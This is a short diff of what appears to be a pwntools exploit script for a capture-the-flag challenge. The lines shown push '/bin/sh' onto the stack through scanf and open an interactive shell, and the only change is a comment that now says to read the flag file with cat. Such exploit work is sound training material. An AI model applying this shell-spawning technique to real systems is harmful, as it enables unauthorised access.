@@ -48,4 +48,4 @@ r.sendline('10') # since we are done, we can make counter 10
 r.recvuntil('0 0 0 0 0 0 0 0 0 0 ')
 r.sendline('/bin/sh') # this is due to scanf that we put to stack
 
-r.interactive() # we can use ls,cd,cat to find flag.
+r.interactive() # after that run `cat /home/arr/flag`
